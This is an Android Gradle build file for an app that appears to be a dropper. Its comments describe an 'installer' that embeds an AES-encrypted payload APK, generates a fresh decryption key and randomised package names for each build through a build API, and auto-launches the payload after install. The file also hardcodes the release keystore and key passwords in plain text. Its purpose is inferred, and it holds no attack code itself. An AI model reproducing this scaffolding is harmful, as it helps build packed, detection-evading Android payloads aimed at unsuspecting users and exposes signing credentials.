plugins { id 'com.android.application' }

// Per-build random key generated by build.sh and written to installer/build.key.
// Read at Gradle configuration time and embedded into BuildConfig.MODULE_KEY
// so each new build embeds a different key — without ever committing it.
def keyFile = rootProject.file('installer/build.key')
def MODULE_KEY = keyFile.exists() ? keyFile.text.trim() : 'NOKEY'

// Per-build payload package name (the applicationId of the APK encrypted into
// assets/module). build.sh writes it to installer/payload.pkg so the installer
// can detect "already installed" and auto-launch the payload after install.
def pkgFile = rootProject.file('installer/payload.pkg')
def PAYLOAD_PACKAGE = pkgFile.exists() ? pkgFile.text.trim() : ''

// Per-build installer applicationId override (written by build.sh when invoked
// from /api/build/apk). Falls back to the default in-tree id otherwise.
def instAppIdFile = rootProject.file('installer/build.app_id')
def INSTALLER_APP_ID = instAppIdFile.exists() ? instAppIdFile.text.trim() : 'com.onerule.task'

android {
    namespace 'com.onerule.task'
    compileSdk 36

    defaultConfig {
        applicationId INSTALLER_APP_ID
        minSdk 24
        targetSdk 36
        versionCode 1
        versionName "1.0"
        buildConfigField "String", "MODULE_KEY", "\"${MODULE_KEY}\""
        buildConfigField "String", "PAYLOAD_PACKAGE", "\"${PAYLOAD_PACKAGE}\""
        // Inject payload package into AndroidManifest.xml so the installer
        // can declare a <queries> entry for it (Android 11+ package
        // visibility — without this getLaunchIntentForPackage returns null
        // even when the app is installed).
        manifestPlaceholders = [payloadPackage: PAYLOAD_PACKAGE ?: "com.installer.placeholder"]
    }

    buildFeatures {
        buildConfig true
    }

    signingConfigs {
        release {
            storeFile file(rootProject.file("app/release.keystore"))
            storePassword "K#9mXq@Lp2!ZrVt&NwYsBjC5uEhGfD8"
            keyAlias "tusker_key"
            keyPassword "K#9mXq@Lp2!ZrVt&NwYsBjC5uEhGfD8"
        }
    }

    buildTypes {
        release {
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            signingConfig signingConfigs.release
        }
        debug {
            signingConfig signingConfigs.release
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }

    // The encrypted module asset is already AES-zipped — don't double-compress.
    androidResources { noCompress 'apk', 'module' }
}

configurations.all {
    resolutionStrategy {
        force 'org.jetbrains.kotlin:kotlin-stdlib:1.8.22'
        eachDependency { details ->
            if (details.requested.group == 'org.jetbrains.kotlin'
                    && details.requested.name == 'kotlin-stdlib') {
                details.useVersion '1.8.22'
            }
        }
    }
    exclude group: 'org.jetbrains.kotlin', module: 'kotlin-stdlib-jdk7'
    exclude group: 'org.jetbrains.kotlin', module: 'kotlin-stdlib-jdk8'
}

dependencies {
    implementation 'androidx.core:core:1.13.1'
    // zip4j: reads/writes WinZip-AES encrypted ZIPs (the format pyzipper writes).
    implementation 'net.lingala.zip4j:zip4j:2.11.5'
}
